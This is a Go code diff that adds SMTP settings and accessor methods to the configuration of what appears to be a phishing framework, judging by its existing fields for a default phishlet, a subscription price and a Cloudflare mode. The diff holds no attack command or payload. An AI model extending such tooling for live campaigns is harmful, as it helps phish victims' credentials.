@@ -127,6 +127,11 @@ type GeneralConfig struct {
 	SubPrice             int    `mapstructure:"sub_price" json:"sub_price" yaml:"sub_price"`
 	DefaultPhishlet      string `mapstructure:"default_phishlet" json:"default_phishlet" yaml:"default_phishlet"`
 	CloudflareMode       bool   `mapstructure:"cloudflare_mode" json:"cloudflare_mode" yaml:"cloudflare_mode"`
+	SmtpHost             string `mapstructure:"smtp_host" json:"smtp_host" yaml:"smtp_host"`
+	SmtpPort             int    `mapstructure:"smtp_port" json:"smtp_port" yaml:"smtp_port"`
+	SmtpUser             string `mapstructure:"smtp_user" json:"smtp_user" yaml:"smtp_user"`
+	SmtpPass             string `mapstructure:"smtp_pass" json:"smtp_pass" yaml:"smtp_pass"`
+	SmtpFrom             string `mapstructure:"smtp_from" json:"smtp_from" yaml:"smtp_from"`
 }
 
 type DNSEntry struct {
@@ -1169,3 +1174,13 @@ func (c *Config) SetSubPrice(v int)             { c.general.SubPrice = v; c.cfg.
 func (c *Config) SetDefaultPhishlet(v string)   { c.general.DefaultPhishlet = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
 func (c *Config) GetCloudflareMode() bool       { return c.general.CloudflareMode }
 func (c *Config) SetCloudflareMode(v bool)      { c.general.CloudflareMode = v; c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig() }
+func (c *Config) GetSmtpHost() string  { return c.general.SmtpHost }
+func (c *Config) GetSmtpPort() int     { return c.general.SmtpPort }
+func (c *Config) GetSmtpUser() string  { return c.general.SmtpUser }
+func (c *Config) GetSmtpPass() string  { return c.general.SmtpPass }
+func (c *Config) GetSmtpFrom() string  { return c.general.SmtpFrom }
+func (c *Config) SetSmtp(host string, port int, user, pass, from string) {
+	c.general.SmtpHost = host; c.general.SmtpPort = port
+	c.general.SmtpUser = user; c.general.SmtpPass = pass; c.general.SmtpFrom = from
+	c.cfg.Set(CFG_GENERAL, c.general); c.cfg.WriteConfig()
+}
